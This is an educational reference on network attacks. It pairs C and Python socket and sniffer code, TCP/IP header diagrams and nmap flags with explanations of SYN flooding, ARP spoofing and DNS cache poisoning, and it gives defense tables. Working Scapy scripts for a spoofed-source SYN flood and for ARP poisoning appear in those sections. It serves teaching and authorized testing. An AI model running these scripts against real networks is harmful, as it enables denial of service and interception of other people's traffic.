# Network Attack Patterns Reference

> **Authorization Notice**: Network attack techniques are documented here for educational purposes, CTF challenges, and authorized penetration testing only. Unauthorized network attacks are illegal. Always obtain written permission before testing any network or system.

## Socket Programming Patterns

### TCP Client (C)

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sockfd;
    struct sockaddr_in target;
    char buffer[1024];

    // 1. Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    // 2. Set target address
    target.sin_family = AF_INET;
    target.sin_port = htons(80);                    // Port 80
    inet_aton("192.168.1.1", &target.sin_addr);     // Target IP

    // 3. Connect
    if (connect(sockfd, (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("connect");
        return 1;
    }

    // 4. Send data
    char *request = "GET / HTTP/1.0\r\nHost: target\r\n\r\n";
    send(sockfd, request, strlen(request), 0);

    // 5. Receive response
    int bytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes] = '\0';
    printf("Received: %s\n", buffer);

    // 6. Close
    close(sockfd);
    return 0;
}
```

### TCP Server (C)

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // 1. Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Set server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);
    server_addr.sin_addr.s_addr = INADDR_ANY;   // Bind to all interfaces

    // Allow port reuse
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // 3. Bind
    bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // 4. Listen
    listen(server_fd, 5);  // Backlog of 5
    printf("Listening on port 8080...\n");

    // 5. Accept connections (blocking)
    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
    printf("Connection from %s:%d\n",
           inet_ntoa(client_addr.sin_addr),
           ntohs(client_addr.sin_port));

    // 6. Exchange data
    char buffer[1024];
    int bytes = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes] = '\0';
    printf("Received: %s\n", buffer);

    char *response = "Hello from server\n";
    send(client_fd, response, strlen(response), 0);

    // 7. Close
    close(client_fd);
    close(server_fd);
    return 0;
}
```

### UDP Client/Server (Python)

```python
import socket

# --- UDP Server ---
def udp_server(port=9999):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"UDP server listening on port {port}")
    while True:
        data, addr = sock.recvfrom(1024)
        print(f"From {addr}: {data.decode()}")
        sock.sendto(b"ACK", addr)

# --- UDP Client ---
def udp_client(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b"Hello UDP", (target_ip, target_port))
    response, _ = sock.recvfrom(1024)
    print(f"Response: {response.decode()}")
    sock.close()
```

---

## Packet Structure Reference

### IP Header (20 bytes minimum)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |    DSCP   |ECN|         Total Length          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|     Fragment Offset     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |        Header Checksum        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if IHL > 5)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Key Fields:**
- **Version** (4 bits): IPv4 = 4
- **IHL** (4 bits): Header length in 32-bit words (minimum 5 = 20 bytes)
- **Total Length** (16 bits): Entire packet size including header and data
- **TTL** (8 bits): Decremented by each router; packet discarded at 0
- **Protocol** (8 bits): 6 = TCP, 17 = UDP, 1 = ICMP
- **Flags**: DF (Don't Fragment), MF (More Fragments)

### TCP Header (20 bytes minimum)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Offset| Res |N|C|E|U|A|P|R|S|F|            Window             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |        Urgent Pointer         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if Offset > 5)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**TCP Flags:**
- **SYN** (S): Synchronize sequence numbers — initiates connection
- **ACK** (A): Acknowledgment field is valid
- **FIN** (F): Sender is finished sending data
- **RST** (R): Reset the connection
- **PSH** (P): Push buffered data to application
- **URG** (U): Urgent pointer field is valid

### UDP Header (8 bytes)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

---

## TCP Three-Way Handshake

```
Client                          Server
  |                               |
  |  ----  SYN (seq=x)  ---->    |   Client initiates connection
  |                               |   Server allocates resources
  |  <-- SYN-ACK (seq=y,ack=x+1) |   Server responds
  |                               |
  |  ----  ACK (ack=y+1) ---->   |   Connection established
  |                               |
  |  <====  Data transfer  ====> |
  |                               |
  |  ----  FIN  ---->            |   Client initiates close
  |  <--  ACK  ----              |
  |  <--  FIN  ----              |
  |  ----  ACK  ---->            |   Connection terminated
  |                               |
```

---

## Network Sniffing with Raw Sockets

### Raw Socket Sniffer (C)

```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

int main() {
    int raw_sock;
    char buffer[65535];
    struct sockaddr_in source;
    socklen_t saddr_len = sizeof(source);

    // Create raw socket to capture all IP packets
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) {
        perror("socket (need root)");
        return 1;
    }

    printf("Sniffing TCP packets...\n");

    while (1) {
        int data_size = recvfrom(raw_sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr *)&source, &saddr_len);

        if (data_size < 0) {
            perror("recvfrom");
            break;
        }

        // Parse IP header
        struct iphdr *ip = (struct iphdr *)buffer;
        struct in_addr src, dst;
        src.s_addr = ip->saddr;
        dst.s_addr = ip->daddr;

        // Parse TCP header (follows IP header)
        int ip_header_len = ip->ihl * 4;
        struct tcphdr *tcp = (struct tcphdr *)(buffer + ip_header_len);

        printf("TCP %s:%d -> %s:%d [%s%s%s%s] seq=%u\n",
               inet_ntoa(src), ntohs(tcp->source),
               inet_ntoa(dst), ntohs(tcp->dest),
               tcp->syn ? "S" : "",
               tcp->ack ? "A" : "",
               tcp->fin ? "F" : "",
               tcp->rst ? "R" : "",
               ntohl(tcp->seq));
    }

    return 0;
}
```

### Packet Capture with libpcap (C)

```c
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

void packet_handler(u_char *args, const struct pcap_pkthdr *header,
                    const u_char *packet) {
    // Skip Ethernet header (14 bytes)
    struct iphdr *ip = (struct iphdr *)(packet + 14);
    struct in_addr src, dst;
    src.s_addr = ip->saddr;
    dst.s_addr = ip->daddr;

    if (ip->protocol == IPPROTO_TCP) {
        int ip_len = ip->ihl * 4;
        struct tcphdr *tcp = (struct tcphdr *)(packet + 14 + ip_len);
        printf("[%d bytes] %s:%d -> ", header->len,
               inet_ntoa(src), ntohs(tcp->source));
        printf("%s:%d\n", inet_ntoa(dst), ntohs(tcp->dest));
    }
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;

    // Open device for capture
    pcap_t *handle = pcap_open_live("eth0", 65535, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }

    // Compile and apply BPF filter
    pcap_compile(handle, &filter, "tcp port 80", 0, PCAP_NETMASK_UNKNOWN);
    pcap_setfilter(handle, &filter);

    // Start capturing (0 = infinite loop)
    printf("Capturing HTTP traffic...\n");
    pcap_loop(handle, 0, packet_handler, NULL);

    pcap_close(handle);
    return 0;
}
```

### BPF Filter Examples

| Filter Expression | Captures |
|---|---|
| `tcp port 80` | HTTP traffic |
| `tcp port 443` | HTTPS traffic (encrypted) |
| `host 192.168.1.100` | All traffic to/from host |
| `src host 10.0.0.1` | Traffic originating from IP |
| `dst port 22` | Traffic destined for SSH |
| `tcp[13] & 2 != 0` | TCP SYN packets |
| `tcp[13] == 18` | TCP SYN-ACK packets |
| `icmp` | ICMP (ping) traffic |
| `udp and port 53` | DNS traffic |
| `not arp` | Everything except ARP |

---

## SYN Flood Mechanics

### How SYN Flood Works

```
Attacker (spoofed IPs)                       Target Server
  |                                            |
  |  -- SYN (src=fake1) -->                    |  Server allocates TCB
  |  -- SYN (src=fake2) -->                    |  Server allocates TCB
  |  -- SYN (src=fake3) -->                    |  Server allocates TCB
  |  ... thousands more ...                    |  ...
  |                                            |
  |                    <-- SYN-ACK (to fake1)  |  Sent to spoofed IP
  |                    <-- SYN-ACK (to fake2)  |  (no ACK will come back)
  |                    <-- SYN-ACK (to fake3)  |
  |                                            |
  |  Server's SYN backlog queue fills up       |
  |  Legitimate connections are REFUSED        |
```

### Why It Works

1. Each SYN causes the server to allocate a Transmission Control Block (TCB)
2. The server sends SYN-ACK to the spoofed source IP
3. No ACK ever comes back (spoofed IP didn't initiate the connection)
4. Half-open connections remain until timeout (often 75 seconds)
5. The SYN backlog queue has a limited size (e.g., 128-1024 entries)
6. When full, the server drops all new connection attempts

### Conceptual Implementation (Python/Scapy)

```python
# EDUCATIONAL ONLY — for authorized testing in isolated lab environments
from scapy.all import *
import random

def syn_flood_demo(target_ip, target_port, count=100):
    """Demonstrate SYN flood concept. Lab use only."""
    for i in range(count):
        # Randomize source IP and source port
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)

        # Craft SYN packet
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S",
                  seq=random.randint(0, 2**32-1))
        packet = ip / tcp

        send(packet, verbose=0)

    print(f"Sent {count} SYN packets to {target_ip}:{target_port}")
```

### SYN Flood Defenses

| Defense | Mechanism |
|---|---|
| **SYN Cookies** | Server encodes connection state in the SYN-ACK sequence number instead of allocating memory. Validates on ACK receipt. |
| **SYN Proxy** | Intermediate device completes handshake with client before forwarding to server. |
| **Rate Limiting** | Limit SYN packets per source IP per second. |
| **Increased Backlog** | Increase `tcp_max_syn_backlog` to handle more half-open connections. |
| **Reduced Timeout** | Lower `tcp_synack_retries` to expire half-open connections faster. |
| **Firewall Rules** | Block spoofed source IPs (BCP38/ingress filtering). |

---

## ARP Spoofing Concept

### Normal ARP Operation

```
Host A (192.168.1.10)            Router/Gateway (192.168.1.1)
MAC: AA:AA:AA:AA:AA:AA           MAC: RR:RR:RR:RR:RR:RR
  |                                |
  |  ARP Request: Who has          |
  |  192.168.1.1?  ------>        |
  |                                |
  |  <------  ARP Reply:          |
  |  192.168.1.1 is at             |
  |  RR:RR:RR:RR:RR:RR            |
  |                                |
  |  Host A's ARP cache:          |
  |  192.168.1.1 -> RR:RR:...    |
```

### ARP Spoofing Attack

```
Host A                  Attacker               Gateway
(192.168.1.10)          (192.168.1.50)         (192.168.1.1)
MAC: AA:AA              MAC: EE:EE             MAC: RR:RR
  |                        |                      |
  |  <-- Fake ARP Reply:   |                      |
  |  "192.168.1.1 is at    |                      |
  |   EE:EE:EE:EE:EE:EE"  |                      |
  |                        |                      |
  |                        |  Fake ARP Reply: --> |
  |                        |  "192.168.1.10 is at |
  |                        |   EE:EE:EE:EE:EE:EE"|
  |                        |                      |
  |  Host A now sends all  |                      |
  |  gateway traffic  -->  |  --> forwards to     |
  |  to Attacker           |      Gateway         |
  |                        |                      |
  |      Attacker can:                            |
  |      - Read all traffic (sniff)               |
  |      - Modify traffic (inject/alter)          |
  |      - Block traffic (DoS)                    |
```

### ARP Spoofing with Scapy (Conceptual)

```python
# EDUCATIONAL ONLY — authorized lab testing
from scapy.all import *

def arp_spoof_demo(target_ip, gateway_ip, interface="eth0"):
    """Demonstrate ARP spoofing concept. Lab use only."""
    # Get target's MAC address
    target_mac = getmacbyip(target_ip)

    # Create spoofed ARP reply:
    # Tell target that gateway_ip is at OUR MAC address
    arp_packet = ARP(op=2,                    # ARP reply
                     pdst=target_ip,          # Target IP
                     hwdst=target_mac,        # Target MAC
                     psrc=gateway_ip)         # We claim to be the gateway

    send(arp_packet, verbose=0)
    print(f"Sent ARP reply: {gateway_ip} is at {get_if_hwaddr(interface)}")

def restore_arp(target_ip, gateway_ip):
    """Restore correct ARP entries."""
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    # Send correct ARP mapping
    arp_packet = ARP(op=2,
                     pdst=target_ip,
                     hwdst=target_mac,
                     psrc=gateway_ip,
                     hwsrc=gateway_mac)
    send(arp_packet, count=5, verbose=0)
```

### ARP Spoofing Defenses

| Defense | Mechanism |
|---|---|
| **Static ARP Entries** | Manually configure critical ARP mappings (doesn't scale) |
| **Dynamic ARP Inspection (DAI)** | Switch validates ARP packets against DHCP snooping binding table |
| **ARP Watch** | Monitor for ARP table changes and alert on suspicious activity |
| **802.1X** | Port-based network access control — authenticate before network access |
| **Encrypted Protocols** | Use TLS/HTTPS — attacker can see but not read encrypted traffic |

---

## Port Scanning Concepts

### TCP Connect Scan

Full three-way handshake. Reliable but easily logged.

```
Open Port:       SYN -->  <-- SYN-ACK  --> ACK    (connection established)
Closed Port:     SYN -->  <-- RST-ACK              (connection refused)
Filtered Port:   SYN -->  (no response / ICMP unreachable)
```

### TCP SYN Scan (Half-Open)

Send SYN, analyze response, send RST to tear down. Faster and stealthier.

```
Open Port:       SYN -->  <-- SYN-ACK  --> RST    (don't complete handshake)
Closed Port:     SYN -->  <-- RST-ACK
Filtered Port:   SYN -->  (no response)
```

### Nmap Scan Types Reference

| Flag | Scan Type | Description |
|---|---|---|
| `-sS` | SYN scan | Half-open, default with root |
| `-sT` | Connect scan | Full connect, no root needed |
| `-sU` | UDP scan | Send UDP probes |
| `-sN` | Null scan | No TCP flags set |
| `-sF` | FIN scan | Only FIN flag set |
| `-sX` | Xmas scan | FIN, PSH, URG flags set |
| `-sA` | ACK scan | Map firewall rules |
| `-sV` | Version scan | Detect service versions |
| `-O` | OS detection | TCP/IP fingerprinting |
| `-A` | Aggressive | OS + version + scripts + traceroute |

---

## DNS Poisoning Concept

### DNS Cache Poisoning Attack Flow

```
1. Victim queries DNS resolver: "What is bank.example.com?"

2. Resolver queries authoritative DNS server

3. RACE CONDITION: Attacker sends forged DNS response
   BEFORE the real response arrives
   - Must guess: Transaction ID (16-bit), source port
   - Forged response maps bank.example.com -> attacker's IP

4. If attacker wins the race:
   Resolver caches: bank.example.com = ATTACKER_IP
   All subsequent queries use the poisoned cache entry

5. Victim's browser connects to attacker's server
   thinking it's the real bank
```

### DNS Poisoning Defenses

| Defense | Mechanism |
|---|---|
| **DNSSEC** | Cryptographic signatures on DNS records — resolver verifies authenticity |
| **Source Port Randomization** | Increases entropy attacker must guess (from 16 to 32+ bits) |
| **0x20 Encoding** | Randomize case of query name — adds ~10 bits of entropy |
| **DNS over HTTPS/TLS** | Encrypt DNS queries — prevents interception and injection |
| **Response Rate Limiting** | Limit DNS responses to prevent amplification attacks |
